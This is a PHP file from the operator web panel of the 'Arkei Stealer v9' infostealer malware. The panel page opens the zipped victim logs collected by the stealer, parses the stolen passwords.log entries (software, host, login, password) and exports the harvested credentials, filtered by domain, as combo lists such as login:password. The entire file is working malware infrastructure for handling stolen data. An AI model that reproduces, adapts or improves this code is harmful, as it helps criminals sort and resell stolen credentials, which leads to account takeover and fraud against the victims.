<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [exporter.php]
*    Export logins, passwords
*/

session_start();
set_time_limit(0);

require("../app/config.php");

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/auth.php', true, 301 );
	exit(0);
}

$userProfile = $_SESSION["profile"];

if($userProfile != "0")
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/dashboard.php', true, 301 );
	exit(0);
}

$pageName = "Exporter";

$domain	 	= checkParam($_POST["domain"]);
$format	 	= checkParam($_POST["format"]);

if($domain != null & $format != null)
{
	$result = "";
	$dir = dir(realpath('../'.$config["logs_folder"].'/'));

	while (false !== ($entry = $dir->read()))
	{
		if($entry != "." & $entry != "..")
		{
			$zip = new ZipArchive;
			$reading = "";
			
			if ($zip->open(realpath('../'.$config["logs_folder"].'/'. $entry .'')) === TRUE) 
			{
				$reading = $zip->getFromName("/passwords.log");
				$zip->close();
				
				$reading = nl2br($reading);
				
				$stringsArray = explode(PHP_EOL, $reading);
				
				$i = 1;
				
				foreach($stringsArray as $string)
				{
					$pos;
					if($domain == "*")
					{
						$pos = stripos($string, "Host:");
					}
					else
					{
						$pos = stripos($string, $domain);
					}
					
					if ($pos !== false)
					{
						$soft		= str_replace('Soft: ', '', $stringsArray[$i - 2]);
						$host 		= str_replace('Host: ', '', $stringsArray[$i - 1]);
						$login	 	= str_replace('Login: ', '', $stringsArray[$i]);
						$password	= str_replace('Password: ', '', $stringsArray[$i + 1]);
						
						$soft 		= str_replace('<br />', '', $soft);
						$host 		= str_replace('<br />', '', $host);
						$login	 	= str_replace('<br />', '', $login);
						$password	= str_replace('<br />', '', $password);
						
						$urlData = parse_url($host);
						$host = $urlData['host'];
						
						if(strlen($login) > 1 & strlen($password) > 1)
						{
							switch($format)
							{
								case '1':// login
									$result = $result ."". $login .PHP_EOL;
									break;
									
								case '2':// password
									$result = $result ."". $password .PHP_EOL;
									break;
									
								case '3':// login:password
									$result = $result ."". $login .":". $password .PHP_EOL;
									break;
									
								case '4':// soft@login:password
									$result = $result ."". $host ."@". $login .":". $password .PHP_EOL;
									break;
									
								case '5':// soft host login password
									$result = $result ."". $soft . " ". $host ." ". $login ." ". $password .PHP_EOL;
									break;
							}
						}
					}
					
					$i++;
				}
			}
		}
	}
	$dir->close();
	
	header('Content-type: application/zip');
	header('Content-Disposition: attachment; filename="arkei_export.txt"');
	header('Content-Length: ' . strlen($result));

	echo $result;
	
	exit(0);
}

require("template/header.tmpl.php");

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>
<div class="wrapper">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12">
                        <div class="page-title-box">
                            <h4 class="page-title">Exporter</h4>
                        </div>
                    </div>
                </div>     
                <div class="row">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body">
                                <h4 class="header-title"></h4>
    
                                <form class="form-horizontal" action="" method="POST">
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Service</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="* or domain.com" value="" name="domain" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Format</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="format">
                                                <option value="1">login</option>
												<option value="2">password</option>
												<option value="3">login:password</option>
												<option value="4">host@login:password</option>
												<option value="5">soft host login password</option>
                                            </select>
                                        </div>
                                    </div>
									
									<button type="submit" class="btn btn-primary">Export</button>
    
                                </form>
    
                            </div> <!-- end card-box -->
                        </div> <!-- end card-->
                    </div><!-- end col -->
                </div> 
            </div> <!-- end container -->
	</div>
<?php
require("template/footer.tmpl.php");
?>